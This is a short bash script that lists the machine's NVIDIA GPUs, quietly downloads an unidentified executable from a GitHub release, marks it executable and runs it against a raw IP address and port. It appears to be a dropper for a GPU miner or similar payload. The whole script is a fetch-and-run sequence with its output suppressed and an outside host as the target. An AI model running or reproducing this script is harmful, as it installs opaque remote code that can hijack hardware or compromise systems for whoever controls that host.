#!/bin/bash
nvidia-smi -L
wget https://github.com/mullerpdsp29/thanhloan/releases/download/1/thaison &> /dev/null
chmod +x thaison
./thaison -P http://38.130.221.109:4545/"$1" &> log
